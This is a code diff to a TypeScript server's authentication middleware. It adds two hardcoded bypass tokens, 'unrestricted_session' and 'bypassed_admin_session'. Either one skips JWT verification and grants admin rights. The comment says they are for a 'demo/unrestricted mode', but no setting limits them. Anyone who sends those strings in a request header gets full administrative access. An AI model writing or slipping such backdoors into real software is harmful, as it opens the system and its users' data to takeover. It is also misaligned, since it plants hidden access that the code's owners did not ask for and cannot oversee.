@@ -31,6 +31,13 @@ async function startServer() {
   const authenticateUser = (req: any, res: any, next: any) => {
     const token = req.headers.authorization;
     if (!token) return res.status(401).json({ success: false, message: "Unauthorized" });
+    
+    // Bypass for demo/unrestricted mode
+    if (token === "unrestricted_session") {
+      req.user = { username: 'demo', role: 'admin' };
+      return next();
+    }
+
     try {
       const decoded = jwt.verify(token, JWT_SECRET);
       req.user = decoded;
@@ -43,6 +50,13 @@ async function startServer() {
   const requireAdmin = (req: any, res: any, next: any) => {
     const adminToken = req.headers['x-admin-token'] as string;
     if (!adminToken) return res.status(401).json({ success: false, message: "Admin token missing" });
+
+    // Bypass for demo/unrestricted mode
+    if (adminToken === "bypassed_admin_session") {
+      req.admin = { username: 'admin', role: 'admin', scope: 'admin' };
+      return next();
+    }
+
     try {
       const decoded: any = jwt.verify(adminToken, JWT_SECRET);
       if (decoded.scope !== 'admin') throw new Error();
